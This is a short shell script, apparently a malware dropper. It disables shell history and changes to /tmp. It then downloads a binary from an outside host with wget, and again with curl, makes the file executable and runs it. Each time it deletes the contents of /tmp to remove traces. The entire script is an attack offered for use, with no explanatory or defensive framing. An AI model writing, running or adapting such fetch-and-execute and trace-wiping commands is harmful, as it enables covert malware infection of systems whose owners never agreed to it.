#!/bin/sh
unset history
cd /tmp
wget http://skiddump.xyz/x/jfh83dj && chmod +x jfh83dj && ./jfh83dj && rm -f /tmp/*
curl -O http://skiddump.xyz/x/jfh83dj && chmod +x jfh83dj && ./jfh83dj && rm -f /tmp/*
rm -f /tmp/*
